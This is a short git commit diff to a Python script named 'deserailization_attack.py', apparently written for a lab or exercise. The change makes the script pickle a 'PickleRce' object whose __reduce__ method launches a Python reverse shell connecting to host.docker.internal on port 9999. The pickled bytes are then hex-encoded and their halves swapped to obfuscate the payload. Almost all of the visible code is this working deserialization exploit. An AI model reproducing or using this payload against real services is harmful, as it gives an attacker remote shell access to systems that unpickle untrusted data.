ec8bfc7ea45e251694e69c2bb1802eb45d9c7747
jerilkbestin <jerilk.bestin@gmail.com>
2025-03-21 18:01:08 -0700

    modified:   deserailization_attack.py

--- deserailization_attack.py
+++ deserailization_attack.py
@@ -8,7 +8,7 @@ class PickleRce(object):
         import subprocess
         return (subprocess.Popen, (('/bin/sh','-c','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"host.docker.internal\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),0))
 
-obfuscate1 = pickle.dumps(token.encode())
+obfuscate1 = pickle.dumps(PickleRce())
 obfuscate2 = obfuscate1.hex()
 obfuscate3 = obfuscate2[len(obfuscate2)//2:] + obfuscate2[:len(obfuscate2)//2]
 
